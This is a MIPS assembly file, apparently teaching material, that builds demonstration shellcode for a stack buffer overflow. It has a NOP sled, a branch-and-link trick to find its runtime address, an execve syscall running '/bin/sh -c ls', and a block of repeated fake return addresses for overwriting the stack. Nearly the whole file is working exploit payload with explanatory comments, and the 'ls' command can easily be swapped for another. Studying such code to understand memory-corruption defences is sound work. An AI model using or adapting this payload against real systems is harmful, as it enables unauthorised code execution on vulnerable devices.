# Demo shellcode

	sc_entry_point = 0x407F84FC   # fake return address for entry point into shellcode
                                     

	.text 
        .globl __start                # __start label is required by MIPS assember
                                      # it will correspond to the beginning of the buffer
__start:
	beq $zero,$zero,next	      # unconditionally back to next:  $ra = address of next:

        .repeat 255                   
	nop                # Shellcode "Catchment area"
	.endr
	
	bal __start        # MIPS has no easy way to get 
                           # contents of PC, to overcome this we use
                           # "branch and link" instruction in an unconventional way:
                           # after this instruction is executed we get
                           #    PC=PC+8-0x408 = actual addr of __start, 
                           #    $ra = PC+4 = actual address of next (!!!)
                           
# All labels in this program are counted from address 0x00000000
# Assembler and linker assume that the label __start: points to address 0x00000000.
#
# The actual address of the shellcode program in memory is unknown 
# at the time of writing.  To ensure that the shellcode works as 
# expected, we need to determine the actual physical addresses of __start:
# at runtime, and use that address as the base for all memory accesses.
#
# The following code uses %lo(x) function to get lower (i.e. least significant) 16-bits
# of 32-bit label addresses. Since our program is very short, the most significant 16-bits
# are all 0000000000000000s anyway and they can be safely discarded. 
#
# The use of %lo(x) ensures that all li and addiu instructions are converted into 
# single-word machine instructions.   
  
next:
        li $t1,%lo(next)     # load the *value* of the label next: to $t1

                             # NOTE that the assembler and linker assume that __start: = 0x0000000, and
                             # we can *think* of the value of all labels in this progarm 
                             # as the *offsets* from 0x000000  !!!

	sub $t0,$ra,$t1      # Thus, we can calculate the *actual* address of __start: by subtracting 
                             # the value (offset) of the label next: from the actual address of label next:
                             # which is stored in $ra

	addiu $a0,$t0,%lo(cmd_arg1)     # $a0 = actual address of cmd_arg1 = $t1 (actual address of __start) +
                                        # + cmd_arg1 (which is the offset of cmd_arg1 from __start)

        sw $a0,%lo(exec_args1)($t0)     # write actual address of cmd_arg1: into the actual location 
                                        # of exec_args1. Again we use exec_args1: value as an offset 
                                        # to be added to the actual locaiton of __start: which is in $t0
        addiu $a0,$t0,%lo(cmd_arg2)
        sw $a0,%lo(exec_args2)($t0)     # store actual address of cmd_arg2 into second element of 
                                        # exec_args array (of pointers)

        addiu $a0,$t0,%lo(cmd)          # a0 = actual address of the file path to the executable    
        sw $a0,%lo(exec_args0)($t0)     # store a0 into the initial element of exec_args array  

	addiu $a1,$t0,%lo(exec_args0)   # a1 = actual address of the exec_args array

        move $a2,$zero                  # a2 = NULL

	li $v0,4011                     # $v0 = 4011 i.e. syscall execve(cmd, exec_args, NULL)

        syscall 
	nop				# required by syscall - will be automatically added if absent
	nop                             # required by syscall - will be automatically added if absent

	.data
 
# Parameters of execve() system call 
# 
# Consult http://manpages.ubuntu.com/manpages/bionic/man2/execve.2.html
# ALSO CONSULT https://stackoverflow.com/questions/10068327/what-does-execve-do

# char *cmd - first argument to execve()

cmd:
	.asciiz "/bin/sh"      # file path to shell executable

# char *exec_args[] - second argument to execve()

cmd_arg1:    
        .asciiz "-c"        # first argument to shell (run specified command)
cmd_arg2:
        .asciiz "ls"      # second argument to shell (command to run)  
exec_args0:
        .word  0x44444444   # this will be replaced by the actual address of cmd
exec_args1:
        .word  0x33333333   # this will be replaced by the actual address of cmd_arg1
exec_args2:
        .word  0x22222222   # this will be replaces by the actual address of cmd_arg2
exec_args_end:
        .word  0            # NULL signifies the end of char *exec_args[] contents

	.repeat 251
        .word sc_entry_point   # area of fake return address
        .endr
